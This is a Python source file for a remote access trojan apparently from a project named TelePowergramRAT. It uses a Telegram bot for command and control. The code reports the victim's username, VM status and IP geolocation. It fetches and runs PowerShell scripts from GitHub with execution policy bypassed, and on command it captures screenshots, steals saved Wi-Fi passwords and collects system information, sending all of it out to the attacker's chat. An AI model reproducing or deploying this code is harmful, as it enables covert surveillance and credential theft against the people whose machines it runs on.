# import subprocess
# import os
# import requests
# import json


# from urllib import request, parse
# from time import sleep






# Telegram Functions and System Related Functions
def runcmd(command):
    out  = subprocess.check_output(command, shell=True, text=True,stderr=True)
    return out
def sendphoto(image_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={CHAT_ID}"
    ret = requests.post(url,files={"photo": open(image_path, "rb")})
    return ret.json()
def sendmessage(msg,reply=False):
    global msgid
    message = parse.quote_plus(msg)
    if reply:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}&parse_mode=Markdown&reply_to_message_id={msgid}"
    else:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}&parse_mode=Markdown"
    return(request.urlopen(url)) # this sends the message
def getUpdates():
    global msg,id,msgid
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    response = requests.get(url)
    final = json.loads(response.text)
    Dict = final['result']
    for obj in Dict:
        pass
    print(id)
    nid = obj['update_id']
    msgid = obj['message']['message_id']
    if id == obj['update_id'] :
        msg = "Same"
    else:
        id = nid
        msg = obj['message']['text']
    return msg


# Main Functions


def systeminfo(msgid):
    url = "https://raw.githubusercontent.com/siddhant385/TelePowergramRAT/main/powershellfunctions/information.ps1"
    if not os.path.exists("information.ps1"):
        request.urlretrieve(url, "information.ps1")
    command = "powershell.exe  -Execution Bypass .\information.ps1"
    result = runcmd(command)
    f = open("systeminfo.txt",'w')
    f.write(result)
    f.close()
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}"
    data = {
      'parse_mode':'Markdown',
      'caption':'_```systeminformation```_',
      'reply_to_message_id':msgid
       }
    ret = requests.post(url,data=data,files={"document": open("systeminfo.txt", "r")})
    # os.remove("systeminfo.txt")
    return ret.json()
def sendscreenshot():
    url = "https://raw.githubusercontent.com/siddhant385/TelePowergramRAT/main/powershellfunctions/screenshot.ps1"
    if not os.path.exists("screenshot.ps1"):
        request.urlretrieve(url, "screenshot.ps1")
    Screenshot = "powershell.exe -Execution Bypass ./screenshot.ps1"
    print(runcmd(Screenshot))
    sendphoto("Screenshot.png")
    os.remove("Screenshot.png")
def wifiStealer():
    url = "https://raw.githubusercontent.com/siddhant385/TelePowergramRAT/main/powershellfunctions/wifi.ps1"
    if not os.path.exists("wifi.ps1"):
        request.urlretrieve(url, "wifi.ps1")
    command = "powershell.exe -Execution Bypass .\wifi.ps1"
    result= runcmd(command)
    return result
def speak(command):
    url = "https://raw.githubusercontent.com/siddhant385/TelePowergramRAT/main/powershellfunctions/speak.ps1"
    if not os.path.exists("speak.ps1"):
        request.urlretrieve(url, "speak.ps1")
    speakcommand = 'powershell.exe  -Execution Bypass .\speak.ps1 "'+f"'{command}'"+'"'
    print(speakcommand)
    return runcmd(speakcommand)
def checkvm():
    url = "https://raw.githubusercontent.com/siddhant385/TelePowergramRAT/main/powershellfunctions/checkvm.ps1"
    if not os.path.exists("checkvm.ps1"):
        request.urlretrieve(url, "checkvm.ps1")
    command = "powershell.exe  -Execution Bypass .\checkvm.ps1"
    return runcmd(command)
def help():
    functionalities = { '/help' : ': shows this message', \
        '/screenshot': ': Captures screen',\
        '/wifi': ': Retrives wifipassword',\
        '/systeminfo': ': Retrives SystemInformation',\
        '/speak [command]': ': Speaks the command',\
        '/exit': ': exits the program'
    }
    response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
    return response

def beginsysteminfo():
    url = 'http://ipinfo.io/json'
    response = requests.get(url)
    data = json.loads(response.text)

    info = "⭕️ Online\n\n"
    info += f"User Name     ➾ {os.getlogin()}    \n" 
    info += f"Computer      ➾ {os.name}          \n" 
    info += f"Machine Type  ➾ {checkvm()}      \n\n"
    info += f"         *IP & IP INFORMATION*    \n\n"
    info += f"ip            ➾ {data['ip']}       \n"
    info += f"Country       ➾ {data['country']}  \n"
    info += f"Region        ➾ {data['region']}   \n"
    info += f"City          ➾ {data['city']}     \n"
    info += f"Postal Code   ➾ {data['postal']}   \n"
    info += f"Timezone      ➾ {data['timezone']} \n"
    return info


#print(speak("hello how are you"))
#wifiStealer()

sendmessage(beginsysteminfo())
run = True
id = ""
msg = ""
msgid = ""
while run:
    try:
        
        sleep(1)
        query = getUpdates()
        # print(query)
        if query == "/screenshot":
            sendmessage("SENDING SCREENSHOT",reply=True)
            sendscreenshot()
        if query=="/systeminfo":
            systeminfo(msgid)
        if query=="/wifi":
            sendmessage("SENDING WIF")
            sendmessage("```"+wifiStealer()+"```",reply=True)
        if query=="/exit":
            run = False
        if query =="/help":
            sendmessage(help(),reply=True)
        if query.startswith("/speak"):
            word = query.replace("/speak","")
            sendmessage(f"SPEAKING {word}")
            speak(word)
            sendmessage(f"SPOKEN {word}",reply=True)

        else:
            continue

    except Exception as e:
        print(e)
        pass
